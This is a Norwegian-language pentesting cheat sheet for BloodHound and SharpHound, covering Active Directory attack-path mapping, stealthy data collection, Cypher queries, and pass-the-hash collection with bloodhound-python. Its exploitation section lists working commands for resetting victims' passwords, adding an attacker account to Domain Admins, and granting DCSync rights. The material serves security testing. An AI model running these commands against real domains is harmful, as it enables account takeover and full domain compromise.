# 🩸 BloodHound – visualisering av angrepsveier i Active Directory

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) | [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

> **Versjonsmerknad:** Veiledningen blander legacy BloodHound med BloodHound Community Edition (CE). CE betyr *Community Edition*, ikke en sky-/enterprise-utgave. Den nyere CE-veiledningen bruker BloodHound CLI og et nettgrensesnitt; `ghst.ly/getbhce`, Neo4j-innlogging og `SharpHound.ps1` tilhører eldre oppsett. Bevarte kommandoer, flagg og Cypher-spørringer må leses i sin versjonskontekst. [SpecterOps: oppdatert kursveiledning](https://specterops.io/blog/2026/04/11/bloodhound-course-update/).
>
> **Presisering:** `Default` er ikke det samme som `All`. Bruk en SharpHound-versjon som passer til BloodHound-utgaven; innsamlingsmetoder og tilgang til øktdata varierer. `DCOnly` betyr begrenset innsamling, ikke usynlighet. [SharpHound CE](https://bloodhound.specterops.io/collect-data/ce-collection/sharphound). CE kan bruke PostgreSQL eller Neo4j som grafdatabase; påstanden «ikke Neo4j» nedenfor er for absolutt. [CE-databasevalg](https://bloodhound.specterops.io/get-started/custom-installation).
>
> **Les grafen:** En node er et objekt, og en kant viser en relasjon eller rettighet. En sikkerhetsprinsipal (*principal*) er for eksempel en bruker, gruppe eller maskinkonto. `HasSession` betyr ikke automatisk tilgang til legitimasjon, og DCSync krever en kombinasjon av relevante rettigheter. Engelske navn på menyer, spørringer og kanter beholdes for gjenkjenning i grensesnittet. [SpecterOps: datainnsamling og rettigheter](https://bloodhound.specterops.io/collect-data/sharphound-data-permissions).

```
  ██████╗ ██╗      ██████╗  ██████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗   ██╗███╗   ██╗██████╗ 
  ██╔══██╗██║     ██╔═══██╗██╔═══██╗██╔══██╗██║  ██║██╔═══██╗██║   ██║████╗  ██║██╔══██╗
  ██████╔╝██║     ██║   ██║██║   ██║██║  ██║███████║██║   ██║██║   ██║██╔██╗ ██║██║  ██║
  ██╔══██╗██║     ██║   ██║██║   ██║██║  ██║██╔══██║██║   ██║██║   ██║██║╚██╗██║██║  ██║
  ██████╔╝███████╗╚██████╔╝╚██████╔╝██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██████╔╝
  ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═════╝ 
                        Visualisering av angrepsveier i AD
```

<p align="center">
  <img src="https://img.shields.io/badge/BloodHound-Active_Directory-red?style=for-the-badge" alt="BloodHound">
  <img src="https://img.shields.io/badge/Attack_Paths-blue?style=for-the-badge" alt="Attack Paths">
  <img src="https://img.shields.io/badge/Graph_Database-green?style=for-the-badge" alt="Graph">
</p>

---

## 📋 Innholdsfortegnelse

- [Hva er BloodHound](#-hva-er-bloodhound)
- [Installasjon](#-installasjon)
- [Datainnsamling med SharpHound](#-datainnsamling-med-sharphound)
- [Bruke det grafiske BloodHound-grensesnittet](#-bruke-det-grafiske-bloodhound-grensesnittet)
- [Innebygde spørringer](#-innebygde-spørringer)
- [Egne Cypher-spørringer](#-egne-cypher-spørringer)
- [Analyse av angrepsveier](#-analyse-av-angrepsveier)
- [BloodHound CE](#-bloodhound-ce)
- [Hurtigreferanse](#-hurtigreferanse)
- [Ressurser](#-ressurser)

---

## 🎯 Hva er BloodHound

**BloodHound** bruker grafteori til å avdekke skjulte angrepsveier i Active Directory. Det visualiserer:

- 🔗 **Angrepsveier** – Veier til domeneadministrator
- 👤 **Brukerrelasjoner** – Gruppemedlemskap og økter
- 💻 **Datamaskintillit** – Administratorrettigheter og økter
- 🔓 **Feilkonfigurasjoner** – Rettigheter som kan utnyttes
- 🎯 **Mål med høy verdi** – Kritiske kontoer

### Komponenter

| Komponent | Beskrivelse |
|-----------|-------------|
| **BloodHound** | Grafisk grensesnitt for visualisering (basert på Neo4j) |
| **SharpHound** | Datainnsamler (.exe eller .ps1) |
| **Neo4j** | Grafdatabase i bakgrunnen |
| **BloodHound CE** | Ny sky-/enterprise-utgave |

---

## 🚀 Installasjon

### Kali Linux

```bash
# Installer BloodHound
sudo apt update
sudo apt install bloodhound

# Installer Neo4j
sudo apt install neo4j

# Start Neo4j
sudo neo4j start

# Åpne Neo4j-nettleseren: http://localhost:7474
# Standardlegitimasjon: neo4j / neo4j (endre ved første innlogging)

# Start BloodHound
bloodhound
```

### Windows

```powershell
# Last ned fra GitHub-utgivelser
https://github.com/BloodHoundAD/BloodHound/releases

# Installer Neo4j Community Edition
https://neo4j.com/download/

# Start Neo4j
# Kjør som administrator og start tjenesten

# Kjør BloodHound.exe
```

### Docker (anbefalt)

```bash
# Neo4j med konfigurasjon klargjort for BloodHound
docker run -d \
  --name neo4j \
  -p 7474:7474 -p 7687:7687 \
  -e NEO4J_AUTH=neo4j/bloodhound \
  neo4j:4.4

# Vent på oppstart, og kjør deretter BloodHound
bloodhound
```

---

## 📡 Datainnsamling med SharpHound

### Last ned SharpHound

```bash
# Fra BloodHound-utgivelser
https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors

# Filer:
# - SharpHound.exe (frittstående)
# - SharpHound.ps1 (PowerShell)
```

### Grunnleggende innsamling

```powershell
# Kjør SharpHound (standard – alle innsamlingsmetoder)
.\SharpHound.exe

# Angi domene
.\SharpHound.exe -d domain.local

# Angi utdata
.\SharpHound.exe -o C:\Temp\

# PowerShell-versjon
Import-Module .\SharpHound.ps1
Invoke-BloodHound
```

### Innsamlingsmetoder

```powershell
# Alle innsamlingsmetoder
.\SharpHound.exe -c All

# Bestemte metoder
.\SharpHound.exe -c Default
.\SharpHound.exe -c Group
.\SharpHound.exe -c Session
.\SharpHound.exe -c Trusts
.\SharpHound.exe -c ACL
.\SharpHound.exe -c Container
.\SharpHound.exe -c RDP
.\SharpHound.exe -c DCOM
.\SharpHound.exe -c PSRemote
.\SharpHound.exe -c LocalAdmin
.\SharpHound.exe -c LocalGroup
.\SharpHound.exe -c SPNTargets
.\SharpHound.exe -c DCOnly
```

### Detaljer om innsamlingsmetoder

| Metode | Beskrivelse | Støy |
|--------|-------------|-------|
| Default | Group, LocalAdmin, Session, Trusts | Lav |
| All | Alt | Høy |
| Session | Påloggede brukere | Middels |
| LocalGroup | Medlemmer av lokale grupper | Middels |
| ACL | ACL-rettigheter | Lav |
| DCOnly | Innsamling bare fra domenekontrollere | Svært lav |
| Group | Gruppemedlemskap | Lav |
| Trusts | Tillitsforhold mellom domener | Lav |

### Diskret innsamling

```powershell
# Diskret modus (langsommere, mindre støy)
.\SharpHound.exe -c DCOnly
.\SharpHound.exe --stealth

# Ingen DNS-oppslag
.\SharpHound.exe --skipdns

# Forsinkelse mellom forespørsler
.\SharpHound.exe --throttle 1000
```

### Gjentatt innsamling (økter)

```powershell
# Samle økter over tid
.\SharpHound.exe -c Session --loop --loopduration 02:00:00

# Gjenta med intervall
.\SharpHound.exe -c Session --loop --loopinterval 00:05:00
```

### Fra Linux (bloodhound.py)

```bash
# Installer
pip install bloodhound

# Kjør innsamling
bloodhound-python -u user -p 'password' -d domain.local -ns 10.10.10.1 -c All

# Med hash
bloodhound-python -u user --hashes :NTLMHASH -d domain.local -c All
```

---

<a id="-bruke-det-grafiske-bloodhound-grensesnittet"></a>
## 🖥️ Bruke det grafiske BloodHound-grensesnittet

### Start BloodHound

```bash
# 1. Start Neo4j
sudo neo4j start

# 2. Vent på Neo4j (kontroller http://localhost:7474)

# 3. Start BloodHound
bloodhound

# 4. Logg inn
# URL: bolt://localhost:7687
# Brukernavn: neo4j
# Passord: (ditt passord)
```

### Importer data

```
1. Klikk på "Upload Data" (mappeikonet)
2. Velg .zip-filen fra SharpHound
3. Vent til importen er fullført
4. Dataene vises i grafen
```

### Oversikt over grensesnittet

| Område | Beskrivelse |
|---------|-------------|
| **Search** | Finn brukere, datamaskiner og grupper |
| **Analysis** | Forhåndsdefinerte spørringer |
| **Filters** | Synlighet for kanter og noder |
| **Graph** | Visuell fremstilling |
| **Node Info** | Detaljer om valgt element |

### Navigering

```
- Venstreklikk: Velg node
- Høyreklikk: Hurtigmeny
- Rull: Zoom inn/ut
- Dra: Flytt visningen
- Ctrl+Click: Legg til i utvalget
```

---

## 🔍 Innebygde spørringer

### Domeneinformasjon

```
- Find all Domain Admins
- Find all Domain Controllers
- Find high value targets
- Map Domain Trusts
```

### Korteste veier

```
- Shortest Paths to Domain Admins
- Shortest Path from Owned Principals
- Shortest Path to High Value Targets
- Shortest Path to Unconstrained Delegation
```

### Kerberos

```
- Find Kerberoastable Accounts
- Find AS-REP Roastable Users
- Shortest Path from Kerberoastable Users
- Find Principals with Unconstrained Delegation
```

### ACL-analyse

```
- Find Principals with DCSync Rights
- Find Dangerous Rights for Domain Users
- Find Users with Foreign Domain Group Membership
```

### Datamaskiner

```
- Find Computers with Unsupported OS
- Find Computers where Domain Users are Local Admin
- Find Computers with Sessions of High Value Users
```

### GPO

```
- Find all GPO Owned by Owned Principals
- Find GPO Affecting High Value Targets
```

---

## 📝 Egne Cypher-spørringer

### Grunnleggende spørringer

```cypher
// Finn alle brukere
MATCH (u:User) RETURN u

// Finn alle datamaskiner
MATCH (c:Computer) RETURN c

// Finn alle domeneadministratorer
MATCH (g:Group {name: "DOMAIN ADMINS@DOMAIN.LOCAL"})
MATCH (u:User)-[:MemberOf*1..]->(g)
RETURN u.name

// Finn alle domenekontrollere
MATCH (c:Computer)-[:MemberOf*1..]->(g:Group)
WHERE g.name CONTAINS "DOMAIN CONTROLLERS"
RETURN c.name
```

### Øktspørringer

```cypher
// Finn hvor domeneadministratorer har økter
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
MATCH (c:Computer)-[:HasSession]->(u)
RETURN u.name, c.name

// Finn brukere med økter på flere datamaskiner
MATCH (c:Computer)-[:HasSession]->(u:User)
WITH u, COUNT(c) as sessions
WHERE sessions > 5
RETURN u.name, sessions
ORDER BY sessions DESC
```

### Stispørringer

```cypher
// Korteste vei til domeneadministrator
MATCH p=shortestPath(
  (u:User {name:"TARGETUSER@DOMAIN.LOCAL"})
  -[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
)
RETURN p

// Alle veier til domeneadministrator (grense 10)
MATCH p=(u:User)-[*1..5]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
RETURN p LIMIT 10

// Veier fra kompromitterte sikkerhetsprinsipaler
MATCH p=shortestPath(
  (u {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
)
RETURN p
```

### ACL-spørringer

```cypher
// Brukere med DCSync-rettigheter
MATCH (u)-[:GetChanges]->(d:Domain)
MATCH (u)-[:GetChangesAll]->(d)
RETURN u.name

// Brukere som kan tilbakestille passord
MATCH (u:User)-[:ForceChangePassword]->(t:User)
RETURN u.name, t.name

// Brukere med GenericAll på datamaskiner
MATCH (u:User)-[:GenericAll]->(c:Computer)
RETURN u.name, c.name
```

### Kerberos-spørringer

```cypher
// Brukere utsatt for Kerberoasting med vei til DA
MATCH (u:User {hasspn:true})
MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
RETURN u.name, LENGTH(p)

// Brukere utsatt for AS-REP roasting
MATCH (u:User {dontreqpreauth:true})
RETURN u.name

// Datamaskiner med ubegrenset delegering
MATCH (c:Computer {unconstraineddelegation:true})
RETURN c.name
```

### Mål med høy verdi

```cypher
// Merk mål med høy verdi
MATCH (u:User {name:"TARGETUSER@DOMAIN.LOCAL"})
SET u.highvalue = true

// Finn veier til mål med høy verdi
MATCH p=shortestPath(
  (u:User)-[*1..]->(t {highvalue:true})
)
RETURN p
```

---

## 🎯 Analyse av angrepsveier

### Finne angrepsveier

```
1. Søk etter startnoden (kompromittert bruker)
2. Høyreklikk → "Mark as Owned"
3. Kjør spørringen: "Shortest Path from Owned Principals"
4. Analyser kantene i angrepsveien
```

### Vanlige angrepskanter

| Kant | Angrepsmetode |
|------|---------------|
| **MemberOf** | Gruppemedlemskap |
| **AdminTo** | Lokale administratorrettigheter |
| **HasSession** | Innsamling av legitimasjon |
| **CanRDP** | RDP-tilgang |
| **CanPSRemote** | Fjernadministrasjon med PowerShell |
| **ExecuteDCOM** | Kjøring via DCOM |
| **GenericAll** | Full kontroll |
| **GenericWrite** | Endre objekt |
| **WriteOwner** | Endre eier |
| **WriteDacl** | Endre ACL |
| **ForceChangePassword** | Tilbakestill passord |
| **AddMember** | Legg til i gruppe |
| **AllExtendedRights** | DCSync osv. |
| **GetChanges** | DCSync (del 1) |
| **GetChangesAll** | DCSync (del 2) |

### Utnytte angrepskanter

#### GenericAll på bruker

```powershell
# Tilbakestill passord
net user targetuser NewP@ssw0rd /domain

# Eller med PowerView
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewP@ssw0rd' -AsPlainText -Force)
```

#### GenericAll på datamaskin

```powershell
# Angrep med ressursbasert begrenset delegering
# Bruk Rubeus + PowerMad
```

#### ForceChangePassword

```powershell
# Tilbakestill passord
net user targetuser NewP@ssw0rd /domain
```

#### AddMember

```powershell
# Legg til bruker i gruppe
net group "Domain Admins" attackeruser /add /domain

# Eller med PowerView
Add-DomainGroupMember -Identity "Domain Admins" -Members "attackeruser"
```

#### WriteDacl

```powershell
# Legg til DCSync-rettigheter
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attackeruser -Rights DCSync
```

---

## 🆕 BloodHound CE

### Om BloodHound CE

**BloodHound Community Edition** er den nye versjonen:
- Moderne nettbasert grensesnitt
- PostgreSQL i bakgrunnen (ikke Neo4j)
- REST-API
- Bedre ytelse

### Installasjon

```bash
# Docker Compose (anbefalt)
curl -L https://ghst.ly/getbhce | docker compose -f - up

# Tilgang: http://localhost:8080
# Standard: admin / (se Docker-loggene)
```

### SharpHound for CE

```powershell
# Last ned CE-kompatibel innsamler
# Fra BloodHound CE-utgivelser

# Kjør innsamling (samme syntaks)
.\SharpHound.exe -c All
```

---

## 📊 Hurtigreferanse

### SharpHound-kommandoer

| Kommando | Beskrivelse |
|---------|-------------|
| `.\SharpHound.exe` | Standardinnsamling |
| `.\SharpHound.exe -c All` | Alle metoder |
| `.\SharpHound.exe -c DCOnly` | Bare domenekontrollere (diskret) |
| `.\SharpHound.exe -c Session --loop` | Gjentatt øktinnsamling |
| `.\SharpHound.exe -d domain.local` | Angi domene |
| `.\SharpHound.exe --stealth` | Diskret modus |

### Vanlige spørringer

| Spørring | Formål |
|-------|---------|
| Find all Domain Admins | Identifiser medlemmer av DA |
| Shortest Path to DA | Finn angrepsvei |
| Kerberoastable Users | Finn SPN-er for roasting |
| AS-REP Roastable | Brukere uten forhåndsautentisering |
| Unconstrained Delegation | Misbruk av delegering |
| DCSync Rights | Finn sikkerhetsprinsipaler med DCSync |

### Arbeidsflyt for analyse

```
1. Samle inn med SharpHound
2. Importer til BloodHound
3. Merk kompromitterte sikkerhetsprinsipaler
4. Kjør "Shortest Path from Owned"
5. Analyser angrepskantene
6. Utfør angrep
7. Merk nye kompromitterte sikkerhetsprinsipaler
8. Gjenta
```

### Viktige filer

```
SharpHound-utdata:
- *_BloodHound.zip (JSON-data)
- computers.json
- users.json
- groups.json
- domains.json
- sessions.json
- ous.json
- gpos.json
- containers.json
```

---

## 📚 Ressurser

- [BloodHound GitHub](https://github.com/BloodHoundAD/BloodHound)
- [SharpHound](https://github.com/BloodHoundAD/SharpHound)
- [BloodHound-dokumentasjon](https://bloodhound.readthedocs.io/)
- [bloodhound.py](https://github.com/fox-it/BloodHound.py)

### Relaterte hurtigreferanser
- [Mimikatz](../../Mimikatz/translations/README.nb.md)
- [PowerShell](../../PowerShell/translations/README.nb.md)
- [Rettighetseskalering i Windows](../../Windows-PrivEsc/translations/README.nb.md)

---

<p align="center">
  <b>🩸 Finn din vei til domeneadministrator!</b><br>
  <i>BloodHound – AD-pentesterens beste venn</i>
</p>
